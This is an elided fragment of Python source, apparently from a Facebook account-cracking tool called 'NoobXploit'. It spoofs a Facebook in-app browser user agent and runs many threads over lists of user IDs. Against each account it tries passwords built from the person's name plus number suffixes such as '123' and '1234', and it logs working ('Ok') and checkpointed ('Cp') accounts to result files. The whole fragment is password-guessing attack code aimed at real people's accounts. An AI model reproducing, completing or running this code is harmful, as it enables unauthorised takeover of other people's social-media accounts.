...
agents = ["Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/360.0.0.10.113;]"
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Auto Password"%(H,P,H,P))
        print("%s[%s2%s]%s Make Your Own Password "%(H,P,H,P))
        ...
        print("\n%s[%s**%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s**%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        ...
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                ...
                if ___password___ in ['1','01']:
                    pwx = [Name, ox[0]+'121', ox[0]+'123',ox[0]+'1234',ox[0]+'12345']
        ...
        print("\n%s[%s1%s]%s Auto Password"%(H,P,H,P))
        print("%s[%s2%s]%s Make Own Password"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
        ...
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                ...
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name, ox[0]+'121', ox[0]+'123',ox[0]+'12345',ox[0]+'1234']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name, ox[0]+'121', ox[0]+'123',ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
        ...
        print("\n%s[%s1%s]%s Auto Password"%(H,P,H,P))
        print("%s[%s4%s]%s Make Own Password"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
